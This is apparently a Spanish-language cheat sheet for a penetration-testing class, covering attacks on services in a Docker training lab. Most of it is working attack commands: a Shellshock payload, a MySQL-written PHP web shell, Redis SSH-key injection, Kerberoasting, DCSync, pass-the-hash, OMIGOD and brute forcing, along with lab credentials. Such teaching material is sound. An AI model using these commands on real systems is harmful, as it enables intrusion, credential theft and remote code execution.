# Chuleta — Clase 05 · Explotación de servicios (Qhapaq)

## Docker — ver/gestionar el laboratorio
```bash
docker compose up -d --build                       # levantar todo
docker compose --profile nube up -d                # + mssql y mongo
docker compose ps                                  # estado
docker compose restart qx-redis                    # reiniciar un objetivo
docker compose down                                # apagar y borrar
docker logs qx-dc01                                # ver quién salió de alcance / depurar

# IP de los contenedores
docker inspect -f '{{.NetworkSettings.Networks.qhapaq-sede.IPAddress}}' qx-ftp          # una
docker inspect -f '{{.Name}} -> {{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}' $(docker ps -q)   # todas
docker network inspect qhapaq-sede -f '{{range .Containers}}{{.Name}} {{.IPv4Address}}{{"\n"}}{{end}}'       # mapa
```

## Escaneo (siempre primero)
```bash
nmap -sn 10.55.0.0/24                               # hosts vivos
nmap -p- -sS 10.55.0.X                              # todos los TCP
nmap -sU --top-ports 50 10.55.0.X                   # UDP (snmp 161, sip 5060, radius 1812)
nmap -sV -sC -p<puertos> 10.55.0.X                  # versión + scripts NSE
```

## FTP · ProFTPd mod_copy (CVE-2015-3306)
```bash
nc 10.55.0.21 21
SITE CPFR /opt/respaldos/config.bak
SITE CPTO /var/ftp/incoming/robado.txt
curl --user 'anonymous:a@b.com' ftp://10.55.0.21/incoming/robado.txt
# msf: use exploit/unix/ftp/proftpd_modcopy_exec
```

## SSH · fuerza bruta + sudo (GTFOBins)
```bash
hydra -L usuarios.txt -P claves.txt ssh://10.55.0.22 -t 4
ssh soporte@10.55.0.22 ; sudo -l
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec='/bin/cat /root/flag-root.txt'
```

## Shellshock (CVE-2014-6271) / Heartbleed (CVE-2014-0160)
```bash
curl -H 'User-Agent: () { :;}; echo; /bin/cat /var/www/bandera-53.txt' http://10.55.0.43/cgi-bin/estado.sh
nmap -p443 --script ssl-heartbleed 10.55.0.43
python3 herramientas/heartbleed.py 10.55.0.43 15     # repite: fuga de RAM aleatoria
```

## MySQL · FILE → OUTFILE
```bash
mysql -h 10.55.0.33 -u webapp -pW3bApp#2023
SELECT clave FROM qhapaq.secretos;
SELECT '<?php system($_GET[0]); ?>' INTO OUTFILE '/var/www/html/sh.php';
# luego: curl 'http://10.55.0.33:8080/sh.php?0=id'
```

## PostgreSQL · COPY FROM PROGRAM (CVE-2019-9193)
```bash
PGPASSWORD='Postgr3s#2024' psql -h 10.55.0.32 -U appsql -d erp
CREATE TABLE c(o text); COPY c FROM PROGRAM 'id; cat /opt/flag-pg.txt'; SELECT * FROM c;
```

## Redis · sin auth → clave SSH
```bash
redis-cli -h 10.55.0.63 ping
ssh-keygen -t rsa -N '' -f k ; (echo;echo;cat k.pub;echo) > ll.txt
cat ll.txt | redis-cli -h 10.55.0.63 -x set c
redis-cli -h 10.55.0.63 config set dir /var/lib/redis/.ssh
redis-cli -h 10.55.0.63 config set dbfilename authorized_keys
redis-cli -h 10.55.0.63 save
ssh -i k redis@10.55.0.63
```

## Active Directory (DC 10.55.0.10)
```bash
# SMB / rpcclient (sesión nula)
smbclient -N -L //10.55.0.10
rpcclient -U "" -N 10.55.0.10 -c "enumdomusers"
rpcclient -U "" -N 10.55.0.10 -c "querydispinfo"      # descripciones con claves

# AS-REP roasting
rpcclient -U "" -N 10.55.0.10 -c enumdomusers | grep -oP '\[\K[^\]]+(?=\] rid)' > usuarios.txt
impacket-GetNPUsers qhapaq.lab/ -dc-ip 10.55.0.10 -usersfile usuarios.txt -no-pass -format hashcat -outputfile asrep.txt
hashcat -m 18200 asrep.txt rockyou.txt

# Kerberoasting
impacket-GetUserSPNs qhapaq.lab/pramos:sunshine1 -dc-ip 10.55.0.10 -request -outputfile tgs.txt
hashcat -m 13100 tgs.txt rockyou.txt

# GPP cpassword (SYSVOL)
smbclient //10.55.0.10/SYSVOL -U 'qhapaq.lab\svc_impresion%Impresora2026!' -c 'recurse ON; prompt OFF; mget *Groups.xml'
gpp-decrypt "<cpassword>"
# python: AES-CBC, clave pública de MS-GPPREF (ver solucion-docente)

# Pass-the-Hash / DCSync
impacket-secretsdump qhapaq.lab/adm_soporte:'Soporte#Qhapaq2026'@10.55.0.10 -just-dc
smbclient //10.55.0.10/Gerencia -U 'QHAPAQ\adm_soporte' --pw-nt-hash --password=<HASH_NT> -c 'get bandera.txt'
```

## WinRM / OMI · OMIGOD (CVE-2021-38647)
```bash
sed 's/TARGET/10.55.0.11/' herramientas/omigod.xml > /tmp/o.xml
curl -sk -X POST https://10.55.0.11:5986/wsman -H 'Content-Type: application/soap+xml;charset=UTF-8' --data-binary @/tmp/o.xml
# msf: use exploit/linux/http/microsoft_omigod
```

## SNMP
```bash
onesixtyone -c /usr/share/wordlists/… 10.55.0.161           # adivinar comunidad
snmpwalk -v2c -c public 10.55.0.161 system
snmpwalk -v2c -c public 10.55.0.161 NET-SNMP-EXTEND-MIB::nsExtendOutputFull
snmpset -v2c -c private 10.55.0.161 SNMPv2-MIB::sysContact.0 s "atacante@evil.com"
```

## VNC / VoIP / RADIUS / Impresoras / SMTP
```bash
hydra -P claves.txt -s 5900 vnc://10.55.0.59 ; vncviewer 10.55.0.59:5900
svwar -m REGISTER -e 1000-2001 10.55.0.60 ; svcrack -u 1002 -d claves.txt 10.55.0.60
radtest admin-wifi 'Wifi.Qhapaq!2026' 10.55.0.18 0 testing123
lpstat -h 10.55.0.31:631 -l -p ; curl http://10.55.0.31:631/printers/
for u in jdiaz noexiste soporte; do (echo "VRFY $u"; sleep 1)|nc 10.55.0.25 25; done
swaks --server 10.55.0.25 --from a@ext.com --to b@otro.com --body hola
```

## RDP / MSSQL / Mongo
```bash
hydra -l gerencia -P claves.txt rdp://10.55.0.38 ; xfreerdp /v:10.55.0.38 /u:gerencia /p:'Gerencia#2025'
impacket-mssqlclient sa:'Qhapaq#2023'@10.55.0.14   # EXEC xp_cmdshell 'whoami'
mongosh mongodb://10.55.0.27:27017                 # use erp; db.secretos.find()
```

## Hashcat — modos útiles
| Modo | Qué es |
|---|---|
| 18200 | AS-REP (Kerberos, `$krb5asrep$`) |
| 13100 | TGS Kerberoast (`$krb5tgs$`) |
| 1000 | NTLM |
| 500 | md5crypt (`$1$`) · 1800 sha512crypt (`$6$`) |
